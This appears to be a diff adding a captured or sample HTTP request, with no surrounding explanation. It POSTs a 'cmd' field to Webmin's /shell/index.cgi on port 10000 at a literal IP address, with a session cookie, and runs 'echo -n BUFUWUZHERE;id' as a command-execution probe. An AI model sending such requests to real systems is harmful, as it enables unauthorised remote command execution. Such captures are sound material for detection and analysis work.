@@ -1,0 +1,15 @@
+POST /shell/index.cgi HTTP/1.1
+Keep-Alive: 300
+Connection: Keep-Alive
+Host: 217.160.223.74:10000
+User-Agent: Conff
+Content-Length: 90
+Content-Type: multipart/form-data; boundary=xYzZY
+Cookie: sid=aa7ecb7b0a2d34b2a7f61a90553264fa
+Cookie2: $Version="1"
+
+--xYzZY
+Content-Disposition: form-data; name="cmd"
+
+echo -n BUFUWUZHERE;id
+--xYzZY--
